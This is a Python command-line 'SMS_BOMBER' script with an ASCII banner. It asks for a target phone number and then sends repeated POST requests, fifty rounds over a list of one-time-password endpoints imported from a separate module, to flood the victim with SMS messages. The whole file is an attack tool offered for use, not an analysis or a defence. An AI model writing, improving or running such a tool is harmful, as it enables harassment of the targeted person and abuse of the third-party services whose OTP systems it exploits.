import time
from api import send_otp_requests, send_otp_requests_json
import requests #pip install requests
import pyfiglet #pip install pyfiglet
from colorama import Fore,init #pip install colorama

init()
print ( Fore.YELLOW + "***************************************************************" )
logo = pyfiglet.figlet_format ("SMS_BOMBER" , font = "slant" )
print (logo)
print ( Fore.YELLOW + """***************************************************************""" )
print ( Fore.WHITE + "\t  \t  By :" + Fore.YELLOW + "Dark Wolf" +" & "+ Fore.YELLOW+ "Mr Kavya" )
print (  "\t  \t    v1.1.0 - 2024" )
print ( Fore.WHITE +"ENTER SMS BOMBER SERVER" + Fore.YELLOW + "---->")
print ( Fore.WHITE + "--->1" + Fore.YELLOW + " SERVER 1 (recomanded) " )
print ( Fore.WHITE + "--->2" + Fore.YELLOW + " SERVER 2 (not working) ")

# get phone number to the user
try:
    server = int(input(Fore.YELLOW + "ENTER SERVER NUMBER" + Fore.WHITE + " (1 or 2) --->" ))
    number = str(input(Fore.YELLOW + "ENTER TARGET NUMBER" + Fore.WHITE + " WITHOUT 0 ----> " ))

    # get apis from api
    if(server == 1):
       apis = "send_otp_requests(number)"

    elif(server == 2):
         apis = "send_otp_requests_json(number)"

    # Loop to send otps 50 times
    if(server == 1):
        apis = send_otp_requests(number) 
    elif(server == 2):
        apis = send_otp_requests_json(number)

    # Loop to send OTPs 50 times
    time.sleep(0.000005)
    for _ in range(50):
        for url, payload, in apis:
            try:
                if(server == 1):
                    response = requests.post(url, data=payload)
                elif(server == 2):
                    response = requests.post(url, json=payload)
                if response.status_code == 200:
                    print( Fore.RED + number + ' ' + Fore.GREEN + "successfully" + ' ' + Fore.LIGHTBLACK_EX + '('+ url +')' +  '.' )
                
            except requests.exceptions.RequestException:
                pass
                
except KeyboardInterrupt:
    print("\nGoodbye!")
